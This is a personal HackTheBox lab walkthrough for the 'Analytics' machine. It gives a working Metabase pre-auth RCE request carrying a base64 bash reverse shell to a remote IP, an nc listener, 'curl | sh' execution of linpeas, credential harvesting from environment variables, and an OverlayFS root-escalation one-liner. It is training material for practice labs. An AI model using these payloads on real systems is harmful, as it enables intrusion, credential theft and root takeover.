![[Analytics.png]]
#HackTheBox #Machines #Seasons #Easy 
## 1
Nmap
Open browser.  its cant open
edit your hosts
Open your browser again. yeah cannn
click navigation, login
browser cant shown anyone, just edit your hosts again
yoo its opened metabase sign in
try open `/api/session/properties`, n find setup api
lets go to `/api/setup/validate`, the result is api endpoint doesnt exist
kayy. lets find the version of metabase with `curl`
search exploit metabase with version
I found it -> [COY](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)
```http
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```
Open burpsuite, send metabase website to repeater, and use the program above
change host `localhost` to `data.analytical.htb`
change `YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx` with your reverse shell base64
dont forget to listening `nc -nvlp {port}`
n run repeater with send
on your terminal, open where you saved the linpeas, and start your server http
on terminal nc, you connect with user 99..., run `curl {MY IP}/linpeas.sh | sh` look in the `system information - environment` section
see the METAPASS section for the password, and METAUSER for the username
login to ssh with `METAUSER@TARGET IP` and `METAPASS`
if you run ls command, you can found flag user.txt
try sudo -l to root privileges, its cant
see version of the machine with uname -a. u can see, ubuntu 22.04.2
lets search exploit ubuntu 22.04.2 on google
i found this site -> [COY](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'; rm -rf l u w m
```
find flag on directory root
congratulations!!😁👍